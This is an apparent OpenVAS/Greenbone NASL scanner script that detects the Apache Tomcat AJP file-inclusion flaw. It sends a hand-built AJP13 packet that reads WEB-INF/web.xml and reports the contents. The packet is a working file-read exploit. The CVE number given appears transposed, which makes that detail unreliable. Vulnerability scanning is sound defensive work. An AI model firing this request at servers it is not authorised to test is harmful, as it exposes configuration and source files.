# Copyright (C) 2020 Greenbone Networks GmbH
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.143545");
  script_version("2020-02-25T10:37:18+0000");
  script_tag(name:"last_modification", value:"2020-02-25 11:00:29 +0000 (Tue, 25 Feb 2020)");
  script_tag(name:"creation_date", value:"2020-02-21 06:01:21 +0000 (Fri, 21 Feb 2020)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2020-1398");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Apache Tomcat AJP RCE Vulnerability");

  script_category(ACT_GATHER_INFO);

  script_copyright("Copyright (C) 2020 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_apache_jserv_detect.nasl");
  script_require_ports("Services/ajp13", 8009);
  script_require_keys("apache/ajp/detected");

  script_tag(name:"summary", value:"Apache Tomcat is prone to a remote code execution vulnerability in the AJP
  connector.");

  script_tag(name:"vuldetect", value:"Sends a crafted AJP13 request and checks the response.");

  script_tag(name:"insight", value:"Apache Tomcat server has a file containing vulnerability, which can be used by
  an attacker to read or include any files in all webapp directories on Tomcat, such as webapp configuration files
  or source code.");

  script_tag(name:"affected", value:"Apache Tomcat versions prior 7.0.100, 8.5.51 or 9.0.31 when the AJP connector
  is enabled.");

  script_tag(name:"solution", value:"Update to version 7.0.100, 8.5.51, 9.0.31 or later.");

  script_xref(name:"URL", value:"https://www.cnvd.org.cn/flaw/show/CNVD-2020-10487");
  script_xref(name:"URL", value:"https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi");
  script_xref(name:"URL", value:"https://tomcat.apache.org/tomcat-7.0-doc/changelog.html");
  script_xref(name:"URL", value:"https://tomcat.apache.org/tomcat-8.5-doc/changelog.html");
  script_xref(name:"URL", value:"https://tomcat.apache.org/tomcat-9.0-doc/changelog.html");

  exit(0);
}

include("byte_func.inc");
include("host_details.inc");
include("misc_func.inc");

include("dump.inc");

port = get_port_for_service(default: 8009, proto: "ajp13");

host = get_host_ip();
host_len = strlen(host);
file = "WEB-INF/web.xml";

ajp_data = raw_string(0x02,                                                         # Code (FORWARD_REQUEST)
                      0x02,                                                         # Method (GET)
                      0x00, 0x08, "HTTP/1.1", 0x00,                                 # Version
                      0x00, 0x05, "/asdf", 0x00,                                    # URI
                      mkword(host_len), host, 0x00,                                 # Remote Address
                      0xff, 0xff,                                                   # Remote Host
                      mkword(host_len), host, 0x00,                                 # SRV
                      0x00, 0x50,                                                   # PORT (80)
                      0x00,                                                         # SSLP (FALSE)
                      0x00, 0x09,                                                   # NHDR
                      0xa0, 0x06, 0x00, 0x0a,
                      "keep-alive", 0x00,
                      0x00, 0x0f, "Accept-Language", 0x00,
                      0x00, 0x0e, "en-US,en;q=0.5", 0x00,
                      0xa0, 0x08, 0x00, 0x01, 0x30, 0x00, # 0
                      0x00, 0x0f, "Accept-Encoding", 0x00,
                      0x00, 0x13, "gzip, deflate, sdch", 0x00,
                      0x00, 0x0d, "Cache-Control", 0x00,
                      0x00, 0x09, "max-age=0", 0x00,
                      0xa0, 0x0e, 0x00, 0x07, "Mozilla", 0x00,
                      0x00, 0x19, "Upgrade-Insecure-Requests", 0x00,                # Upgrade-Insecure-Requests 1
                      0x00, 0x01,
                      0x31, 0x00,
                      0xa0, 0x01, 0x00, 0x09, "text/html", 0x00,
                      0xa0, 0x0b, mkword(host_len), host,                           # Remote IP
                      0x00,
                      0x0a, 0x00, 0x21, "javax.servlet.include.request_uri", 0x00,
                      0x00, 0x01, "/", 0x00,
                      0x0a, 0x00, 0x1f, "javax.servlet.include.path_info", 0x00,
                      0x00, 0x0f, file, 0x00,
                      0x0a, 0x00, 0x22, "javax.servlet.include.servlet_path", 0x00,
                      0x00, 0x01, "/", 0x00,
                      0xff);

pkt_len = strlen(ajp_data);

ajp_pkt = raw_string(0x12, 0x34,      # Magic
                     mkword(pkt_len), # Length
                     ajp_data);

sock = open_sock_tcp(port);
if (!sock)
  exit(0);

send(socket: sock, data: ajp_pkt);
recv = recv(socket: sock, length: 8192);

close(sock);

if (!recv || strlen(recv) < 12)
  exit(0);

if (hexstr(recv[4]) == "04" && hexstr(substr(recv, 5, 6)) == "00c8") {
  report = 'It was possible to read the file "' + file + '" through the ajp13 connector.\n\nResult:\n\n' + recv;
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
